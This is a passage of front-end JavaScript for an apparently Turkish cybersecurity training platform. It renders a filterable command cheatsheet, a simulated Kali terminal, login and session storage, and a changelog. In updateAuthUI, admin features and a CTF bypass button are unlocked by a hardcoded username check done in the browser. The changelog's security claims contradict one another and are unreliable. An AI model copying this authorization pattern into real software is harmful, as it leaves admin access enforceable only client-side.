            tabs.forEach(t => t.classList.remove('active'));

            const targetTab = tabsBar.querySelector(`[data-curriculum-team="${team}"]`) || tabsBar.querySelector('[data-curriculum-team="all"]');
            if (targetTab) targetTab.classList.add('active');

            const cards = container.querySelectorAll('.curriculum-chapter-card');
            cards.forEach(card => {
                const scope = card.dataset.teamScope;
                if (team === 'all' || scope === team) {
                    card.style.display = 'block';
                } else {
                    card.style.display = 'none';
                }
            });
        };

        // Tab click delegation
        tabsBar.addEventListener('click', (e) => {
            const btn = e.target.closest('.curriculum-team-btn');
            if (!btn) return;
            const team = btn.dataset.curriculumTeam || 'all';
            window.activateAcademyTeamTab(team);
        });

        // Jump buttons delegation inside curriculum cards
        container.addEventListener('click', (e) => {
            const btnJumpCat = e.target.closest('.btn-jump-commands-cat');
            if (btnJumpCat) {
                const cat = btnJumpCat.dataset.cat || 'all';
                navigateToPage('page-commands');
                const pill = document.querySelector(`#academy-category-pills [data-cat="${cat}"]`);
                if (pill) pill.click();
                return;
            }

            const btnJumpCmd = e.target.closest('.btn-jump-terminal-cmd');
            if (btnJumpCmd) {
                const cmd = btnJumpCmd.dataset.cmd || '';
                navigateToPage('page-terminal');
                if (cmd && typeof window.runKaliCommand === 'function') {
                    window.runKaliCommand(cmd);
                }
            }
        });

        // Initialize default tab: red team active
        window.activateAcademyTeamTab('red');
    }

    // ==========================================
    // SİBER AKADEMİ 140+ COMMANDS ENGINE & FILTER
    // ==========================================
    function bindAcademyCheatsheet() {
        const container = document.getElementById('academy-commands-container');
        const searchInput = document.getElementById('academy-cmd-search');
        const pillContainer = document.getElementById('academy-category-pills');
        const countBadge = document.getElementById('academy-count-badge');
        const btnOpenTerminal = document.getElementById('btn-open-terminal-from-academy');

        if (btnOpenTerminal) {
            btnOpenTerminal.addEventListener('click', () => navigateToPage('page-terminal'));
        }

        let activeCat = 'all';

        function renderAcademyCommands(category, query) {
            if (!container) return;
            const commands = window.ACADEMY_COMMANDS || [];
            const q = (query || '').toLowerCase().trim();

            const filtered = commands.filter(item => {
                const matchesCat = category === 'all' || item.category === category;
                const matchesQuery = !q ||
                    item.title.toLowerCase().includes(q) ||
                    item.desc.toLowerCase().includes(q) ||
                    item.cmd.toLowerCase().includes(q) ||
                    item.badge.toLowerCase().includes(q) ||
                    item.categoryName.toLowerCase().includes(q);
                return matchesCat && matchesQuery;
            });

            if (countBadge) {
                countBadge.textContent = `${filtered.length} / ${commands.length} KOMUT LİSTELENDİ`;
            }

            if (filtered.length === 0) {
                container.innerHTML = `
                    <div style="text-align: center; padding: 40px; background: var(--bg-card); border-radius: var(--radius-md); border: 1px dashed var(--border);">
                        <p style="color: var(--text-muted); font-size: 13.5px;">"${escapeHtml(query)}" aramasına uygun komut bulunamadı.</p>
                        <button class="btn-ghost-sm" id="btn-reset-academy-search" style="margin-top: 10px;">Filtreleri Temizle</button>
                    </div>
                `;
                const btnReset = document.getElementById('btn-reset-academy-search');
                if (btnReset) {
                    btnReset.addEventListener('click', () => {
                        if (searchInput) searchInput.value = '';
                        if (pillContainer) {
                            pillContainer.querySelectorAll('.filter-pill').forEach(p => p.classList.remove('active'));
                            const allPill = pillContainer.querySelector('[data-cat="all"]');
                            if (allPill) allPill.classList.add('active');
                        }
                        activeCat = 'all';
                        renderAcademyCommands('all', '');
                    });
                }
                return;
            }

            container.innerHTML = filtered.map(item => `
                <div class="cheatsheet-card" data-cmd-id="${item.id}">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; flex-wrap: wrap; gap: 8px;">
                        <strong style="color: #ffffff; font-size: 14px;">${item.id}. ${escapeHtml(item.title)}</strong>
                        <div style="display: flex; gap: 6px; align-items: center;">
                            <span class="badge-soft-cyan" style="font-size: 10px; font-weight: 700;">${escapeHtml(item.categoryName)}</span>
                            <span class="badge-tech">${escapeHtml(item.badge)}</span>
                        </div>
                    </div>
                    <p style="font-size: 12.5px; color: var(--text-secondary); margin-bottom: 8px; line-height: 1.5;">
                        ${escapeHtml(item.desc)}
                    </p>
                    <div class="cmd-code-line">
                        <code>${escapeHtml(item.cmd)}</code>
                        <div class="cmd-actions">
                            <button type="button" class="btn-cmd-copy" data-copy="${escapeHtml(item.cmd)}">📋 Kopyala</button>
                            <button type="button" class="btn-cmd-run" data-run="${escapeHtml(item.cmd)}">⚡ Kali'de Çalıştır</button>
                        </div>
                    </div>
                </div>
            `).join('');
        }

        // Search input event
        if (searchInput) {
            searchInput.addEventListener('input', () => {
                renderAcademyCommands(activeCat, searchInput.value);
            });
        }

        // Category pills click via delegation
        if (pillContainer) {
            pillContainer.addEventListener('click', (e) => {
                const pill = e.target.closest('.filter-pill');
                if (!pill) return;
                pillContainer.querySelectorAll('.filter-pill').forEach(p => p.classList.remove('active'));
                pill.classList.add('active');
                activeCat = pill.dataset.cat || 'all';
                renderAcademyCommands(activeCat, searchInput ? searchInput.value : '');
            });
        }

        // Delegated click handler on container for copy & run
        if (container) {
            container.addEventListener('click', (e) => {
                const copyBtn = e.target.closest('.btn-cmd-copy');
                if (copyBtn) {
                    e.stopPropagation();
                    const textToCopy = copyBtn.dataset.copy || '';
                    if (!textToCopy) return;

                    navigator.clipboard.writeText(textToCopy).then(() => {
                        const originalText = copyBtn.textContent;
                        copyBtn.textContent = '✔ Kopyalandı!';
                        copyBtn.style.borderColor = 'var(--green)';
                        copyBtn.style.color = 'var(--green)';
                        showToast('success', 'Komut Kopyalandı', `"${textToCopy}" panoya kopyalandı.`);
                        setTimeout(() => {
                            copyBtn.textContent = originalText;
                            copyBtn.style.borderColor = '';
                            copyBtn.style.color = '';
                        }, 1800);
                    }).catch(() => {
                        showToast('error', 'Kopyalama Hatası', 'Panoya kopyalama izni verilmedi.');
                    });
                    return;
                }

                const runBtn = e.target.closest('.btn-cmd-run');
                if (runBtn) {
                    e.stopPropagation();
                    const cmdToRun = runBtn.dataset.run || '';
                    if (!cmdToRun) return;

                    if (typeof window.runKaliCommand === 'function') {
                        window.runKaliCommand(cmdToRun);
                        showToast('info', 'Kali Terminali Devrede', `"${cmdToRun}" terminalde çalıştırıldı.`);
                    }
                }
            });
        }

        // Quick Command Chips Bar on Terminal Page
        document.querySelectorAll('.quick-cmd-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                const cmd = btn.dataset.terminalCmd;
                if (cmd && typeof window.runKaliCommand === 'function') {
                    window.runKaliCommand(cmd);
                }
            });
        });

        // Initial render of all 142 commands
        renderAcademyCommands('all', '');
    }

    // ==========================================
    // AUTHENTICATION & SESSION STORAGE ENGINE
    // ==========================================
    async function restoreSession() {
        const token = localStorage.getItem('cyber_token') || sessionStorage.getItem('cyber_token');
        if (!token) {
            updateAuthUI(null);
            return;
        }

        state.token = token;
        try {
            const data = await api.me();
            if (data && data.user) {
                state.currentUser = data.user;
                updateAuthUI(data.user);
            } else {
                clearSession();
            }
        } catch {
            clearSession();
        }
    }

    function updateAuthUI(user) {
        const zone = document.getElementById('user-auth-zone');
        const adminSection = document.getElementById('nav-section-admin');
        const btnLogs = document.getElementById('nav-btn-logs');

        if (!zone) return;

        if (user) {
            const isAdmin = user.role === 'admin' || user.username.toLowerCase() === 'burak_wyxz';
            zone.innerHTML = `
                <div style="display: flex; align-items: center; gap: 8px;">
                    <div class="user-pill-badge">
                        <span class="pulsing-beacon" style="background: ${isAdmin ? 'var(--red)' : 'var(--green)'};"></span>
                        <span style="font-weight: 700; color: #ffffff;">${escapeHtml(user.username)}</span>
                        <span class="user-role-tag ${isAdmin ? 'admin' : ''}">${isAdmin ? 'YÖNETİCİ' : 'KULLANICI'}</span>
                    </div>
                    <button class="btn-ghost-sm" id="topbar-logout-btn" title="Oturumu Kapat">Çıkış</button>
                </div>
            `;

            const logoutBtn = document.getElementById('topbar-logout-btn');
            if (logoutBtn) logoutBtn.addEventListener('click', clearSession);

            // Show admin visitor logs & admin superpowers if burak_wyxz
            if (adminSection) adminSection.style.display = isAdmin ? 'block' : 'none';
            if (btnLogs) btnLogs.style.display = isAdmin ? 'flex' : 'none';
            const btnBypass = document.getElementById('btn-admin-bypass-ctf');
            if (btnBypass) btnBypass.classList.toggle('hidden', !isAdmin);
        } else {
            zone.innerHTML = `
                <button class="btn-glow-blue btn-sm" id="topbar-login-btn">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/>
                        <polyline points="10 17 15 12 10 7"/>
                        <line x1="15" y1="12" x2="3" y2="12"/>
                    </svg>
                    <span>Giriş</span>
                </button>
            `;

            const loginBtn = document.getElementById('topbar-login-btn');
            if (loginBtn) loginBtn.addEventListener('click', openAuthModal);

            if (adminSection) adminSection.style.display = 'none';
            if (btnLogs) btnLogs.style.display = 'none';
        }

        renderSessionStorageInspector();
    }

    function clearSession() {
        state.token = null;
        state.currentUser = null;
        sessionStorage.removeItem('cyber_token');
        sessionStorage.removeItem('cyber_callsign');
        sessionStorage.removeItem('cyber_role');
        sessionStorage.removeItem('cyber_status');
        sessionStorage.removeItem('cyber_auth_timestamp');
        localStorage.removeItem('cyber_token');
        localStorage.removeItem('cyber_user');
        localStorage.removeItem('cyber_callsign');
        localStorage.removeItem('cyber_role');

        updateAuthUI(null);
        showToast('info', 'Oturum Kapatıldı', 'Session Storage temizlendi.');
        if (state.activePage === 'page-logs') {
            navigateToPage('page-dashboard');
        }
    }

    function bindAuthModal() {
        const modal = document.getElementById('auth-modal');
        const closeBtn = document.getElementById('btn-close-auth-modal');
        const tabSignin = document.getElementById('modal-tab-signin');
        const tabSignup = document.getElementById('modal-tab-signup');
        const form = document.getElementById('auth-modal-form');
        const rowConfirm = document.getElementById('auth-row-confirm');
        const titleEl = document.getElementById('auth-main-title');
        const subEl = document.getElementById('auth-main-subtitle');
        const btnExec = document.getElementById('auth-btn-execute');
        const alertBox = document.getElementById('auth-modal-alert');
        const inpUser = document.getElementById('auth-input-username');
        const inpPass = document.getElementById('auth-input-password');
        const inpConf = document.getElementById('auth-input-confirm');

        let isSignup = false;

        function setMode(signup) {
            isSignup = signup;
            if (alertBox) alertBox.innerHTML = '';
            if (tabSignin) tabSignin.classList.toggle('active', !signup);
            if (tabSignup) tabSignup.classList.toggle('active', signup);
            if (rowConfirm) rowConfirm.classList.toggle('hidden', !signup);

            if (signup) {
                if (titleEl) titleEl.textContent = 'Yeni Operatör Kaydı';
                if (subEl) subEl.textContent = 'Yeni kullanıcı hesabı oluşturun ve Session Storage tokeni edinin';
                if (btnExec) btnExec.textContent = 'Kayıt Ol & Token Al →';
            } else {
                if (titleEl) titleEl.textContent = 'Operatör Kimlik Doğrulama';
                if (subEl) subEl.textContent = 'Güvenli Erişim Ağ Geçidi • JWT Bearer Token Yönetimi';
                if (btnExec) btnExec.textContent = 'Giriş Yap & Session Storage\'a Kaydet →';
            }
        }

        if (tabSignin) tabSignin.addEventListener('click', () => setMode(false));
        if (tabSignup) tabSignup.addEventListener('click', () => setMode(true));
        if (closeBtn && modal) closeBtn.addEventListener('click', () => modal.classList.add('hidden'));

        if (modal) {
            modal.addEventListener('click', (e) => {
                if (e.target === modal) modal.classList.add('hidden');
            });
        }

        if (form) {
            form.addEventListener('submit', async (e) => {
                e.preventDefault();
                const username = inpUser.value.trim();
                const password = inpPass.value;
                const confirm = inpConf ? inpConf.value : '';

                if (isSignup && password !== confirm) {
                    if (alertBox) {
                        alertBox.innerHTML = `<div class="alert-box-danger">Şifreler birbiriyle eşleşmiyor!</div>`;
                    }
                    return;
                }

                if (alertBox) {
                    alertBox.innerHTML = `<div class="alert-box-info">Doğrulanıyor, lütfen bekleyin...</div>`;
                }

                try {
                    const res = isSignup
                        ? await api.register(username, password)
                        : await api.login(username, password);

                    if (res.ok && res.data && res.data.token) {
                        state.token = res.data.token;
                        state.currentUser = res.data.user;

                        // Save directly into window.sessionStorage
                        sessionStorage.setItem('cyber_token', res.data.token);
                        sessionStorage.setItem('cyber_callsign', res.data.user.username);
                        sessionStorage.setItem('cyber_role', res.data.user.role);
                        sessionStorage.setItem('cyber_status', 'AUTHORIZED_BEARER');
                        sessionStorage.setItem('cyber_auth_timestamp', new Date().toISOString());

                        updateAuthUI(res.data.user);
                        modal.classList.add('hidden');
                        form.reset();

                        showToast('success', 'Giriş Başarılı', `Hoş geldiniz ${res.data.user.username}. JWT token Session Storage'a kaydedildi.`);

                        // Telemetry ping
                        pingVisitorTelemetry(state.activePage);
                    } else {
                        const errMsg = res.data?.error || 'Kullanıcı adı veya şifre hatalı.';
                        if (alertBox) {
                            alertBox.innerHTML = `<div class="alert-box-danger">${escapeHtml(errMsg)}</div>`;
                        }
                    }
                } catch (err) {
                    if (alertBox) {
                        alertBox.innerHTML = `<div class="alert-box-danger">Bağlantı hatası oluştu: ${escapeHtml(err.message)}</div>`;
                    }
                }
            });
        }
    }

    function openAuthModal() {
        const modal = document.getElementById('auth-modal');
        if (modal) modal.classList.remove('hidden');
    }

    // ==========================================
    // JWT LAB & SESSION STORAGE INSPECTOR
    // ==========================================
    function renderSessionStorageInspector() {
        const grid = document.getElementById('storage-keys-grid');
        const pill = document.getElementById('storage-status-pill');
        if (!grid) return;

        const keys = [
            'cyber_token',
            'cyber_callsign',
            'cyber_role',
            'cyber_status',
            'cyber_auth_timestamp',
            'cyber_theme'
        ];

        let activeCount = 0;
        grid.innerHTML = keys.map(k => {
            const val = sessionStorage.getItem(k);
            const hasVal = val !== null && val !== undefined && val !== '';
            if (hasVal) activeCount++;

            const displayVal = hasVal
                ? (k === 'cyber_token' ? `${val.substring(0, 32)}... (${val.length} chars)` : val)
                : '<span style="color: var(--text-muted);">(sessionStorage içinde yok)</span>';

            return `
                <div class="storage-key-card ${hasVal ? 'filled' : 'empty'}">
                    <div class="storage-key-name">sessionStorage['${k}']</div>
                    <div class="storage-key-value">${escapeHtml(displayVal)}</div>
                </div>
            `;
        }).join('');

        if (pill) {
            if (activeCount > 0) {
                pill.className = 'storage-status-pill active';
                pill.textContent = `● Session Storage: Aktif (${activeCount} Anahtar)`;
            } else {
                pill.className = 'storage-status-pill empty';
                pill.textContent = '● Session Storage: Boş';
            }
        }
    }

    // ==========================================
    // SİBER ROL & TAKIM TESTİ (RED vs BLUE vs PURPLE)
    // ==========================================
    
    // ==========================================
    // LFL PLATFORM CHANGELOG & UPDATE LOG MODAL
    // ==========================================
    function bindChangelogModal() {
        const modal = document.getElementById('changelog-modal');
        const closeBtn = document.getElementById('btn-close-changelog-modal');
        const footerCloseBtn = document.getElementById('btn-footer-close-changelog');
        const topbarBtn = document.getElementById('btn-changelog-toggle');
        const sidebarBtn = document.getElementById('nav-btn-changelog');
        const listContainer = document.getElementById('changelog-timeline-list');
        const searchInput = document.getElementById('changelog-search-input');
        const filtersContainer = document.getElementById('changelog-filters');

        if (!modal) return;

        const CHANGELOG_DATA = [
        {
            version: 'v4.5',
            date: '10 Kasım 2026',
            tag: 'MAJOR UPDATE // INTERACTIVE CYBER SUITE',
            tagClass: 'tag-major',
            isLatest: true,
            title: 'Canlı Paket Simülatörü, LFL Sentinel Asistan, Red vs Blue Düello & Sertifika',
            desc: 'Eğitim odalarına ve ana sayfaya görsel paket yolculuğu simülatörü, akıllı hata yakalayıcı asistan (LFL Sentinel), Web Audio ses efektleri, Speedrun kronometresi, kişisel not defteri (.md) indirici ve mezuniyet sertifikası eklendi.',
            items: [
                { type: 'NEW', text: '<strong>Canlı Paket Yolculuğu Simülatörü:</strong> Akademi terminalinde komut çalıştırıldığında paketin istemciden hedef sunucuya gidiş-dönüşünü canlı gösteren ağ şeması eklendi.' },
                { type: 'NEW', text: '<strong>LFL Sentinel Akıllı Siber Mentor:</strong> Kullanıcının terminalde yaptığı yazım hatalarını veya unuttuğu parametreleri (<code>-c</code>, <code>|</code>, <code>ipconfig</code> vb.) anında tespit edip öğreten asistan eklendi.' },
                { type: 'NEW', text: '<strong>Günün Siber Görevi & Red vs Blue Düello:</strong> Ana sayfaya günlük seri sayacı olan mini terminal görevi ve canlı saldırılara karşı savunma hamlesi seçilen Red vs Blue düello modu eklendi.' },
                { type: 'NEW', text: '<strong>Sertifika, Not Defteri İndirici, Ses & Speedrun:</strong> Akademi üst barına tek tıkla yazdırılabilir Başarı Sertifikası, Kişisel Not Defteri (<code>.md</code>) indirici, Web Audio ses efektleri ve Speedrun kronometresi eklendi.' }
            ]
        },
        {
            version: 'v4.4',
            date: '10 Kasım 2026',
            tag: 'MAJOR REDESIGN // YENİ ANA SAYFA MİMARİSİ',
            tagClass: 'tag-major',
            isLatest: false,
            title: 'Ana Sayfa 2.0: Sıfır Karmaşa, Hızlı Seviye Seçici ve Merkezde Starter Track',
            desc: 'Ana sayfadaki (index.html) kalıntı backend kartları, sahte DEFCON/Kernel telemetri kutuları ve uzun biyografi blokları kaldırılarak sıfırdan gelen kullanıcıyı ilk 5 saniyede aksiyona yönlendiren 5 bölümlü modern yapı kuruldu.',
            items: [
                { type: 'NEW', text: '<strong>Yeni Odaklı Hero Alanı:</strong> Teknik jargondan arındırılmış "Siber Güvenliği Yaparak Öğrenin" karşılama alanı ve yumuşak kaydırmalı (smooth scroll) aksiyon butonları eklendi.' },
                { type: 'NEW', text: '<strong>Hızlı Seviye Yönlendirici (3 Mini Kart):</strong> "Tamamen Sıfırım" (01 Ağ Temelleri), "Temelim Var" (09 Nmap) ve "Doğrudan Tatbikat" (Red/Blue/Purple Dallar) hızlı atlama kartları eklendi.' },
                { type: 'IMPROVED', text: '<strong>Starter Track & Yetenek Ağacı Merkezde:</strong> 18 Temel Starter Odası ve Red/Blue/Purple uzmanlık dalları sayfanın doğrudan ana omurgası haline getirildi.' },
                { type: 'SECURITY', text: '<strong>Gerçek İstemci Taraflı Mimari Özeti:</strong> Gerçekte olmayan backend iddiaları (.NET 8, EF SQLite, Kestrel, modprobe) ve kırmızı tatbikat bandı temizlenerek projenin gerçek JavaScript simülasyon gücü öne çıkarıldı.' }
            ]
        },
        {
            version: 'v4.3',
            date: '10 Kasım 2026',
            tag: 'MAJOR UPDATE // ACADEMY 2.0 PEDAGOJİK REHBER',
            tagClass: 'tag-major',
            isLatest: false,
            title: 'Akademi 2.0: Sıfırdan Öğretici Komut Röntgeni, Çıktı Tercümesi & Kavram Rehberi',
            desc: 'Tüm 69 eğitim odası (özellikle 18 Starter odası) ezberden tamamen arındırılarak sıfırdan başlayan birinin bile her kelimesini anlayacağı 5 aşamalı interaktif öğretici rehberle donatıldı.',
            items: [
                { type: 'NEW', text: '<strong>1. Bu Komutu Neden Kullanıyoruz?:</strong> Her odada komutun gerçek hayatta hangi sorunu çözdüğünü ve neden mouse yerine bu komutu kullandığımızı anlatan sade Türkçe mantık kartı eklendi.' },
                { type: 'NEW', text: '<strong>2. Komutun Kelime Kelime Röntgeni:</strong> Komuttaki her kelimenin ve parametrenin (<code>-tuln</code>, <code>-sV</code>, <code>-c 4</code>, <code>|</code>, <code>chmod 700</code> vb.) tek tek ne işe yaradığını gösteren görsel röntgen tablosu eklendi.' },
                { type: 'NEW', text: '<strong>3. Terminal Çıktısı Tercümesi:</strong> Komutu çalıştırdıktan sonra ekrana gelen İngilizce teknik satırların (<code>LISTEN</code>, <code>0.0.0.0</code>, <code>eth0</code>, <code>ttl=64</code>, <code>UID=0</code>) satır satır Türkçe açıklaması eklendi.' },
                { type: 'NEW', text: '<strong>4. Sıfırdan Terimler Sözlüğü & Mini Mantık Testi:</strong> Odadaki yabancı terimleri açıklayan mini sözlük ve ezber yapmadan konuyu anlayıp anlamadığını ölçen 1-tıkla Mini Mantık Kontrolü eklendi.' }
            ]
        },
            {
                version: "v4.2",
                date: "10 Kasım 2026",
                date_en: "November 10, 2026",
                badge: "CANLI / CTF 2.0",
                badge_en: "LIVE / CTF 2.0",
                isLatest: false,
                title: "CTF Arena 2.0: 10 Kademeli Operasyon, Canlı Görev Zinciri & 6000 XP",
                title_en: "CTF Arena 2.0: 10-Stage Operations, Live Mission Chain & 6000 XP",
                items: [
                    {
                        cat: "feat",
                        tag: "CTF 2.0",
                        tag_en: "CTF 2.0",
                        text: "<strong>10 Kademeli Siber Operasyon (6000 XP):</strong> CTF Arenası 6 seviyeden 10 kapsamlı operasyona yükseltildi. Seviye 4.1 Active Directory Kerberoasting, Seviye 4.2 SOC Zeek C2 Tehdit Avı, Seviye 5.1 Docker Konteyner Kaçışı ve Seviye 5.2 Kernel Zero-Day & Rootkit Tersine Mühendislik (Grand Final Boss) eklendi.",
                        text_en: "<strong>10-Stage Cyber Operations (6000 XP):</strong> Expanded CTF Arena from 6 to 10 full operations including Level 4.1 AD Kerberoasting, Level 4.2 SOC Zeek C2 Hunt, Level 5.1 Docker Container Breakout, and Level 5.2 Kernel Zero-Day & Rootkit Reverse Engineering."
                    },
                    {
                        cat: "feat",
                        tag: "Özellik",
                        tag_en: "Feature",
                        text: "<strong>İnteraktif Adım Adım Görev Zinciri & Tek Tıkla Çalıştırma:</strong> Her CTF operasyonuna canlı görev adımları eklendi. Terminalde doğru komutu yazdığınızda adım otomatik olarak ✔ işaretlenir veya <code>⚡ Çalıştır</code> butonuyla anında terminale gönderilebilir.",
                        text_en: "<strong>Interactive Step-by-Step Mission Checklist & One-Click Execute:</strong> Added live mission step checklists that automatically check off (✔) as you run commands or let you fire commands via <code>⚡ Run</code>."
                    },
                    {
                        cat: "feat",
                        tag: "Telemetri",
                        tag_en: "Telemetry",
                        text: "<strong>Canlı CTF Operasyon HUD & Tek Tıkla Bayrak Teslimi:</strong> Aktif hedef sistem, operasyon sayacı (kronometre), kategori filtreleri ve terminalde bayrak bulunduğunda beliren <code>🚩 Bayrağı Otomatik Teslim Et</code> butonu eklendi.",
                        text_en: "<strong>Live CTF Telemetry HUD & Auto-Claim Flag Button:</strong> Added 4-card live HUD with operation timer, track filters, and an instant <code>🚩 Auto-Claim Flag</code> button inside terminal output whenever a flag is uncovered."
                    }
                ]
            },
            {
                version: "v4.1",
                date: "10 Kasım 2026",
                date_en: "November 10, 2026",
                badge: "STABLE",
                badge_en: "STABLE",
                isLatest: false,
                title: "Bilingual i18n Motoru & Tetikleyici İzolasyonu",
                title_en: "Bilingual i18n Engine & Trigger Isolation",
                items: [
                    {
                        cat: "feat",
                        tag: "Özellik",
                        tag_en: "Feature",
                        text: "<strong>Tam Çift Dilli (TR / EN) i18n Motoru:</strong> Menüler, 3D kartlar, yetenek ağacı, loglar ve değerlendirme modülü dahil 101 farklı bileşen tek tıkla ve sıfır gecikmeyle İngilizce / Türkçe arasında geçiş yapar.",
                        text_en: "<strong>Full Bilingual (TR / EN) i18n Engine:</strong> Menus, 3D cards, skill tree, audit logs, and assessment quiz across 101 distinct components translate instantly between Turkish and English with zero latency."
                    },
                    {
                        cat: "fix",
                        tag: "Düzeltme",
                        tag_en: "Fix",
                        text: "<strong>Tetikleyici İzolasyonu & 300ms Debounce Kilidi:</strong> Dil butonunun çift event tetikleyerek dili aynı milisaniyede geri döndürmesini engelleyen donanım seviyesinde debounced durum kilidi uygulandı.",
                        text_en: "<strong>Trigger Isolation & 300ms Debounce Lock:</strong> Prevented dual event execution loop on the language toggle button with hardware-grade state debounce protection."
                    },
                    {
                        cat: "feat",
                        tag: "Özellik",
                        tag_en: "Feature",
                        text: "<strong>İnteraktif Sistem Güncelleme Günlüğü (Changelog):</strong> Platforma eklenen tüm sürümleri, özellikleri ve adli düzeltmeleri listeleyen, aranabilir ve filtrelenebilir sürüm takip paneli eklendi.",
                        text_en: "<strong>Interactive System Changelog:</strong> Added a dedicated, searchable, and category-filtered release history panel recording all platform modules and security advancements."
                    },
                    {
                        cat: "fix",
                        tag: "Optimizasyon",
                        tag_en: "Perf",
                        text: "<strong>Dinamik Cache-Busting (?v=4.1):</strong> Tarayıcı önbellek kilitlenmelerini ortadan kaldırmak için tüm script ve stil linkleri v4.1 sürümüne yükseltildi.",
                        text_en: "<strong>Dynamic Cache-Busting (?v=4.1):</strong> Upgraded all script and style assets to v4.1 query strings to prevent browser cache stale states."
                    }
                ]
            },
            {
                version: "v4.0",
                date: "9 Kasım 2026",
                date_en: "November 9, 2026",
                badge: "MİMARİ",
                badge_en: "ARCHITECTURE",
                title: "İnteraktif Siber Kariyer & Yetenek Ağacı",
                title_en: "Interactive Cyber Career & Skill Tree",
                items: [
                    {
                        cat: "feat",
                        tag: "Özellik",
                        tag_en: "Feature",
                        text: "<strong>İnteraktif Skill Tree & Yol Haritası:</strong> Sıfırdan başlayanlar için Kök Starter (18 Oda), Red Team (20 Oda), Blue Team (17 Oda) ve Purple Team (14 Oda) uzmanlaşma dalları ve SVG bağlantı çizgileri eklendi.",
                        text_en: "<strong>Interactive Skill Tree & Roadmap:</strong> Added Root Starter (18 Rooms), Red Team (20 Rooms), Blue Team (17 Rooms), and Purple Team (14 Rooms) branches with dynamic SVG connector tracks."
                    },
                    {
                        cat: "feat",
                        tag: "Özellik",
                        tag_en: "Feature",
                        text: "<strong>10 Soruluk Kurumsal Siber Rol Belirleme Testi:</strong> Gerçekçi kurumsal senaryolarla kullanıcının avcı, savunucu veya stratejist yeteneğini analiz eden ve özel akademi odasına yönlendiren test motoru.",
                        text_en: "<strong>10-Question Corporate Cyber Role Quiz:</strong> Real-world scenario assessment measuring offensive hunter, defensive guardian, and strategist affinities with direct track routing."
                    },
                    {
                        cat: "ui",
                        tag: "Arayüz",
                        tag_en: "UI",
                        text: "<strong>Dinamik Skor Grafiği & İlerleme Çubukları:</strong> Test bitiminde her takım için yüzdelik başarı oranları ve doğrudan komut kütüphanesine atlama bağlantıları.",
                        text_en: "<strong>Dynamic Score Breakdown & Progress Bars:</strong> Percentage breakdowns for each cyber specialization track upon quiz completion with direct CLI library shortcuts."
                    }
                ]
            },
            {
                version: "v3.9",
                date: "8 Kasım 2026",
                date_en: "November 8, 2026",
                badge: "KOMUT MOTORU",
                badge_en: "CLI ENGINE",
                title: "143+ Kali Komut Motoru & 80+ Terimli Siber Sözlük",
                title_en: "143+ Kali CLI Engine & 80+ Term Cyber Glossary",
                items: [
                    {
                        cat: "feat",
                        tag: "Özellik",
                        tag_en: "Feature",
                        text: "<strong>143+ Endüstri Standardı Kali CLI Motoru:</strong> Nmap, Gobuster, Wireshark, Suricata, Hydra, Mimikatz, John the Ripper, Volatility araçlarının yerel bellek içi sıfır gecikmeli terminal simülasyonu.",
                        text_en: "<strong>143+ Industry-Standard Kali CLI Engine:</strong> Zero-latency in-memory terminal simulation of Nmap, Gobuster, Wireshark, Suricata, Hydra, Mimikatz, John, and Volatility."
                    },
                    {
                        cat: "acad",
                        tag: "Akademi",
                        tag_en: "Academy",
                        text: "<strong>Starter Track Genişletmesi (18 Temel Oda):</strong> IP, Port, DNS, TCP/UDP, Linux CLI, chmod, process kill, grep, tcpdump ve etik hackleme ilkelerini baştan sona öğreten temel rota.",
                        text_en: "<strong>Starter Track Expansion (18 Essential Rooms):</strong> Comprehensive root path teaching IP, Ports, DNS, TCP/UDP, Linux CLI, chmod, ps/kill, grep, tcpdump, and ethical hacking."
                    },
                    {
                        cat: "acad",
                        tag: "Sözlük",
                        tag_en: "Glossary",
                        text: "<strong>Siber Kılavuz & Sözlük (80+ Terim):</strong> EDR bypass, C2 frameworks, HSTS, Kestrel gibi teknik terimlerin günlük hayattan analojilerle basitleştirilmiş açıklamaları.",
                        text_en: "<strong>Cyber Guide & Glossary (80+ Terms):</strong> Complex technical concepts like EDR bypass, C2 frameworks, HSTS, and Kestrel explained with real-world everyday analogies."
                    },
                    {
                        cat: "acad",
                        tag: "Akademi",
                        tag_en: "Academy",
                        text: "<strong>Toplam 69 Görev Odası:</strong> Starter (18), Red Team (20), Blue Team (17) ve Purple Team (14) odalarıyla sektör standardı laboratuvar ortamı.",
                        text_en: "<strong>Total 69 Academy Mission Rooms:</strong> Industry-standard cyber range with Starter (18), Red (20), Blue (17), and Purple (14) scenario environments."
                    }
                ]
            },
            {
                version: "v3.8",
                date: "8 Kasım 2026",
                date_en: "November 8, 2026",
                badge: "GÜVENLİK",
                badge_en: "SECURITY",
                title: "Zero-Trust Savunma Kalkanları & Güvenlik Mimarisi",
                title_en: "Zero-Trust Defense Shields & Security Architecture",
                items: [
                    {
                        cat: "sec",
                        tag: "Güvenlik",
                        tag_en: "Security",
                        text: "<strong>Zero-Trust & RBAC İzolasyon Simülatörü:</strong> mTLS karşılıklı kimlik doğrulaması ve iç ağda yetkisiz yatay geçiş (lateral movement) engelleme motoru.",
                        text_en: "<strong>Zero-Trust & RBAC Isolation Simulator:</strong> Mutual TLS authentication and strict prevention of unauthorized internal lateral traversal."
                    },
                    {
                        cat: "sec",
                        tag: "Güvenlik",
                        tag_en: "Security",
                        text: "<strong>WAF & Katı SQLi / XSS Filtresi:</strong> Dinamik sorgular yerine parametrik LINQ bağlama ve katı CSP Script-Whitelist ile tarayıcı seviyesinde tam zırhlama.",
                        text_en: "<strong>WAF & Rigid SQLi / XSS Defense:</strong> Parameterized LINQ binding instead of string concatenation, reinforced with strict CSP script whitelisting."
                    },
                    {
                        cat: "sec",
                        tag: "Güvenlik",
                        tag_en: "Security",
                        text: "<strong>Brute-Force Rate Limiter & Karantina:</strong> 5 istek/saniye üzerindeki agresif IP'leri otomatik karantina listesine alan kayan pencere algoritması.",
                        text_en: "<strong>Brute-Force Rate Limiter & Quarantine:</strong> Sliding window token bucket isolating aggressive hosts exceeding 5 req/sec into automated quarantine."
                    }
                ]
            },
            {
                version: "v3.0",
                date: "7 Kasım 2026",
                date_en: "November 7, 2026",
                badge: "TEMEL MOTOR",
                badge_en: "CORE ENGINE",
                title: "Görsel Çekirdek & Parallax Motoru",
                title_en: "Visual Core & Parallax Engine",
                items: [
                    {
                        cat: "ui",
                        tag: "Arayüz",
                        tag_en: "UI",
